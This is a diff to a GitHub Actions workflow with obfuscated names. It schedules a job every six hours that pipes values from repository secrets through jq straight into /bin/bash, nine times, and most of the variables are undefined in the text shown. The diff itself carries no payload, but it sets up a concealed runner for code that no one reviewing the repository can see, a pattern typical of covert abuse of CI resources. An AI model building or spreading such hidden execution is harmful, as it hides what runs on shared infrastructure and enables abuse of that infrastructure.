@@ -1,19 +1,25 @@
 name: liurushi6781
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 5/6 * * *'
-jobs:  # 26998
+    - cron: '23 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liurushi6781
         env:
-          ad9553: ${{ secrets.ad9553 }}
+          wq6558: ${{ secrets.wq6558 }}
         run: |
-          echo $ad9553 | jq -r .q5942 | /bin/bash
-          echo $dh7788 | jq -r .iwghz6381 | /bin/bash
+          echo $wq6558 | jq -r .hle9863 | /bin/bash
+          echo $gt5 | jq -r .mlu38528 | /bin/bash
+          echo $ifw1358 | jq -r .dcyda8141 | /bin/bash
+          echo $y027 | jq -r .gzp7 | /bin/bash
+          echo $q42 | jq -r .k4 | /bin/bash
+          echo $xwlr7 | jq -r .aic2 | /bin/bash
+          echo $czsf6 | jq -r .cwkdx6219 | /bin/bash
+          echo $wv53831 | jq -r .iplvx96768 | /bin/bash
+          echo $q08897 | jq -r .fk998 | /bin/bash
 
